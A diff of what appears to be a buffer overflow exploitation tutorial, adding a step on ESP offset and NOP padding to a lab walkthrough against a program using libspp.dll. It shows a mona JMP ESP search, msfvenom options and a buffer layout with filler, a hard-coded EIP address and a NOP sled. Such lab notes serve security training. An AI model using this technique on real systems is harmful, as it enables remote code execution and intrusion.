@@ -60,8 +60,13 @@ As the ESP address can be changed during each execution, we need to find a "JMP 
   Immunity Debugger Command: !mona find -s "\xe4\xff" -m <program name>
                          e.g. !mona find -s “\xff\xe4” -m "libspp.dll"
   
-  
-### Step 7 Generating ShellCode using Metasploit
+
+### Step 7 Check the offset (btw ESP and playload)     
+
+After the ESP address, check is there any overlapping between ESP and the playload area. Offset may required. 
+Secondly, add NoP before place the shell code to avoid the shell code corruption during the GetPC routine overwrite a few bytes on the stack.   
+
+### Step 8 Generating ShellCode using Metasploit
 
     Metasploit Command: msfvenom -l payloads
   
@@ -72,12 +77,12 @@ As the ESP address can be changed during each execution, we need to find a "JMP 
     -b exclude character 
     EXITFUNC-thread exit the function after exploit which makes the program can still running for next exploit.
  
- ### Step 8 Sending the ShellCode 
+ ### Step 9 Sending the ShellCode 
  
     filler = "A" * 780
     eip = "\x83\x0c\x09\x10" <- this address is pointing the the JMP ESP instruction set
     offset = "C" * 4
-    nops = "\x90" * 10
+    nops = "\x90" * 10 <- shell code corruption
     inputBuffer = filler + eip + offset + nops + shellcode
  
   Program: 4-expolit-lin.py
